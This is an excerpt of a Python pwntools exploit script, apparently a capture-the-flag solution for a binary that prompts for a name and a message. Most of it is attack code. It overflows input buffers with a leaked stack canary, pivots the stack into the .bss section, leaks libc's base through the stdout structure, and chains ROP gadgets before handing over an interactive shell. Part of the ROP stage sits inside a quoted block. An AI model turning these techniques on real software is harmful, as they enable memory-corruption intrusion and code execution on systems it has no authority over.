...
r.sendafter('Thanks', b'B'*0x18 + p64(canary) + p64(bss-0x38) + p64(printf)) ###
r.sendafter('What is your name : ', b'C'*0x30) ###
r.recvuntil('C'*0x30)
bss = code_base + 0x4a00

libc_base = u64(r.recv(6)+b'\x00\x00') - libc.sym['_IO_2_1_stdout_']
r.sendafter('Leave your message here : ', b'D'*0x18 + p64(canary) + p64(bss-0x200) + p64(printf)) ###
...
movsxd_rdx_esi_ret = 0x000000000013b7de + libc_base
...
"""
r.sendafter('What is your name : ', p64(pop_rdx_ret) + p64(0x300) + p64(code_base+0x1261) + p64(canary) + p64(bss) + p64(leave_ret))
r.sendafter('What is your name : ', b'\x00'*(rop_offset-8) + p64(bss) + ROP)
r.sendafter('Leave your message here :', b'A'*0x18 + p64(canary) + p64(rop_addr-8) + p64(leave_ret))
r.recvuntil('What is your name : ')
"""
r.interactive()
